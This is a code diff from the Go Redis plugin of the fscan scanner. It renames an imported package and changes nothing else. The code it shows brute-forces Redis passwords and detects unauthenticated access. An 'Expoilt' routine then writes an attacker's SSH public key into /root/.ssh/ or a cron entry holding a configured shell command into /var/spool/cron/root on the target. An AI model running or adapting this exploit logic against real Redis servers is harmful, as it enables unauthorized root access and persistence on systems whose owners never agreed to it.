@@ -3,8 +3,8 @@ package Plugins
 import (
 	"bufio"
 	"fmt"
+	"github.com/shadow1ng/fscan/Common"
 	"github.com/shadow1ng/fscan/Config"
-	"github.com/shadow1ng/fscan/common"
 	"io"
 	"net"
 	"os"
@@ -23,22 +23,22 @@ func RedisScan(info *Config.HostInfo) (tmperr error) {
 	if flag == true && err == nil {
 		return err
 	}
-	if common.IsBrute {
+	if Common.IsBrute {
 		return
 	}
-	for _, pass := range common.Passwords {
+	for _, pass := range Common.Passwords {
 		pass = strings.Replace(pass, "{user}", "redis", -1)
 		flag, err := RedisConn(info, pass)
 		if flag == true && err == nil {
 			return err
 		} else {
 			errlog := fmt.Sprintf("[-] redis %v:%v %v %v", info.Host, info.Ports, pass, err)
-			common.LogError(errlog)
+			Common.LogError(errlog)
 			tmperr = err
-			if common.CheckErrs(err) {
+			if Common.CheckErrs(err) {
 				return err
 			}
-			if time.Now().Unix()-starttime > (int64(len(common.Passwords)) * common.Timeout) {
+			if time.Now().Unix()-starttime > (int64(len(Common.Passwords)) * Common.Timeout) {
 				return err
 			}
 		}
@@ -49,12 +49,12 @@ func RedisScan(info *Config.HostInfo) (tmperr error) {
 func RedisConn(info *Config.HostInfo, pass string) (flag bool, err error) {
 	flag = false
 	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
-	conn, err := common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(common.Timeout)*time.Second)
+	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
 	if err != nil {
 		return flag, err
 	}
 	defer conn.Close()
-	err = conn.SetReadDeadline(time.Now().Add(time.Duration(common.Timeout) * time.Second))
+	err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second))
 	if err != nil {
 		return flag, err
 	}
@@ -71,11 +71,11 @@ func RedisConn(info *Config.HostInfo, pass string) (flag bool, err error) {
 		dbfilename, dir, err = getconfig(conn)
 		if err != nil {
 			result := fmt.Sprintf("[+] Redis %s %s", realhost, pass)
-			common.LogSuccess(result)
+			Common.LogSuccess(result)
 			return flag, err
 		} else {
 			result := fmt.Sprintf("[+] Redis %s %s file:%s/%s", realhost, pass, dir, dbfilename)
-			common.LogSuccess(result)
+			Common.LogSuccess(result)
 		}
 		err = Expoilt(realhost, conn)
 	}
@@ -85,12 +85,12 @@ func RedisConn(info *Config.HostInfo, pass string) (flag bool, err error) {
 func RedisUnauth(info *Config.HostInfo) (flag bool, err error) {
 	flag = false
 	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
-	conn, err := common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(common.Timeout)*time.Second)
+	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
 	if err != nil {
 		return flag, err
 	}
 	defer conn.Close()
-	err = conn.SetReadDeadline(time.Now().Add(time.Duration(common.Timeout) * time.Second))
+	err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second))
 	if err != nil {
 		return flag, err
 	}
@@ -107,11 +107,11 @@ func RedisUnauth(info *Config.HostInfo) (flag bool, err error) {
 		dbfilename, dir, err = getconfig(conn)
 		if err != nil {
 			result := fmt.Sprintf("[+] Redis %s unauthorized", realhost)
-			common.LogSuccess(result)
+			Common.LogSuccess(result)
 			return flag, err
 		} else {
 			result := fmt.Sprintf("[+] Redis %s unauthorized file:%s/%s", realhost, dir, dbfilename)
-			common.LogSuccess(result)
+			Common.LogSuccess(result)
 		}
 		err = Expoilt(realhost, conn)
 	}
@@ -119,7 +119,7 @@ func RedisUnauth(info *Config.HostInfo) (flag bool, err error) {
 }
 
 func Expoilt(realhost string, conn net.Conn) error {
-	if common.Noredistest {
+	if Common.Noredistest {
 		return nil
 	}
 	flagSsh, flagCron, err := testwrite(conn)
@@ -128,16 +128,16 @@ func Expoilt(realhost string, conn net.Conn) error {
 	}
 	if flagSsh == true {
 		result := fmt.Sprintf("[+] Redis %v like can write /root/.ssh/", realhost)
-		common.LogSuccess(result)
-		if common.RedisFile != "" {
-			writeok, text, err := writekey(conn, common.RedisFile)
+		Common.LogSuccess(result)
+		if Common.RedisFile != "" {
+			writeok, text, err := writekey(conn, Common.RedisFile)
 			if err != nil {
 				fmt.Println(fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text))
 				return err
 			}
 			if writeok {
 				result := fmt.Sprintf("[+] Redis %v SSH public key was written successfully", realhost)
-				common.LogSuccess(result)
+				Common.LogSuccess(result)
 			} else {
 				fmt.Println("[-] Redis ", realhost, "SSHPUB write failed", text)
 			}
@@ -146,15 +146,15 @@ func Expoilt(realhost string, conn net.Conn) error {
 
 	if flagCron == true {
 		result := fmt.Sprintf("[+] Redis %v like can write /var/spool/cron/", realhost)
-		common.LogSuccess(result)
-		if common.RedisShell != "" {
-			writeok, text, err := writecron(conn, common.RedisShell)
+		Common.LogSuccess(result)
+		if Common.RedisShell != "" {
+			writeok, text, err := writecron(conn, Common.RedisShell)
 			if err != nil {
 				return err
 			}
 			if writeok {
 				result := fmt.Sprintf("[+] Redis %v /var/spool/cron/root was written successfully", realhost)
-				common.LogSuccess(result)
+				Common.LogSuccess(result)
 			} else {
 				fmt.Println("[-] Redis ", realhost, "cron write failed", text)
 			}
